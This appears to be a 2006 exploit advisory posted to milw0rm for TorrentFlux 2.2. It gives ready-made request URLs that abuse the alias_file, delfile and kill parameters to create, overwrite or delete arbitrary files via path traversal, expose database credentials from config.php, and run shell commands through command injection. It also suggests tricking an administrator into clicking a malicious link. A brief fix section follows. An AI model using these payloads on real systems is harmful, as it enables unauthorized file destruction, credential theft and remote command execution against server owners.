<html><head><title>TorrentFlux <= 2.2 (Create/Exec/Delete) Multiple Remote Vulnerabilities</title></head><pre>#################################################################################################
#                                                                                               #
#                                    r0ut3r Presents...                                         #
#                                                                                               #
#                                Another r0ut3r discovery!                                      #
#                                                                                               #
# TorrentFlux 2.2 Arbitrary File Creation/Overwrite/Deletion &amp; Command Execution Vulnerablities #
#                                                                                               #
#################################################################################################
#                                                                                               #
# Software: TorrentFlux 2.2                                                                     #
#                                                                                               #
# Vendor: http://www.torrentflux.com/                                                           #
#                                                                                               #
# Released: 2006/11/15                                                                          #
#                                                                                               #
# Discovered By: r0ut3r (writ3r [at] gmail.com)                                                 #
#                                                                                               #
# Criticality: Highly critical                                                                  #
#                                                                                               #
# Note: The information provided in this document is for TorrentFlux administrator              #
# testing purposes only!                                                                        #
#                                                                                               #
# &quot;TorrentFlux 2.2Beta does not seem to be vulnerable&quot;                                          #
#################################################################################################

   TorrentFlux 2.2 Arbitrary File Creation/Overwrite/Deletion &amp; Command Execution Vulnerablity
-------------------------------------------------------------------------------------------------

alias_file = name of file you want to create.
delfile = name of file you want to remove

-= To overwrite a file (make sure q.php is there, provided thats the file you want to overwrite): =-
/torrentflux/index.php?alias_file=../../q.php&amp;kill=3361&amp;kill_torrent= q.torrent

-= To create a file: =-
/torrentflux/index.php?alias_file=q.php&amp;kill=3361&amp;kill_torrent=q.torrent

All files are filled with:
0
0
Torrent Stopped

-= Exploit on config.php =-
/torrentflux/index.php?alias_file=../../config.php&amp;kill=3361&amp;kill_torrent=q.torrent
It will redirect you to index.php and it will display the DATABASE USERNAME/PASSWORD IN PLAINTEXT, plus the rest of the config information!

index.php displays:
0 -100 Torrent Stopped * TorrentFlux PHP Torrent Manager * www.torrentflux.com

**************************************************************/ /* This file is part of TorrentFlux. TorrentFlux is free software; you can

redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either

...etc...

**************************************************************************/ // YOUR DATABASE CONNECTION INFORMATION

/**************************************************************************/ // Check the adodb/drivers/ directory for support for your

database // you may choose from many (mysql is the default) $cfg[&quot;db_type&quot;] = &quot;mysql&quot;; // mysql, postgres7 view adodb/drivers/

$cfg[&quot;db_host&quot;] = &quot;localhost&quot;; // DB host computer name or IP $cfg[&quot;db_name&quot;] = &quot;tf&quot;; // Name of the Database $cfg[&quot;db_user&quot;] = &quot;root&quot;; //

username for your MySQL database $cfg[&quot;db_pass&quot;] = &quot;owned&quot;; // password for database

-= Files can also be deleted like so: =-
/torrentflux/index.php?alias_file=owned.php&amp;kill=3361&amp;delfile=owned.php

-= Command Execution Exploit =-
/torrentflux/index.php?alias_file=owned.php&amp;kill= ; echo &quot;r0ut3r's TorrentFlux 0day&quot; &gt; /tmp/q.php&amp;kill_torrent=q.torrent&amp;return=true

Replace kill parameter like so:
kill=; your command
kill=; echo &quot;r0ut3r just owned your system! hacked!&quot; &gt; /tmp/read_this.php

The only draw back is that you have to be a registered member before you can access the functions of index.php.
Alternatively you could direct the administrator to a link which overwrites the config.php file, then catch the output on index.php somehow (be quick).

Solution:
----------
Sanitize all variables listed above and below.
alias_file
delfile
kill
kill_torrent

Solution 2:
-----------
Set up .htaccess and only allow certain people to login until an offical patch is released.

----------------------------------------------------------------------------------------------
              This has been another r0ut3r discovery (writ3r [ at ] gmail.com)
----------------------------------------------------------------------------------------------

# milw0rm.com [2006-11-15]</pre></html>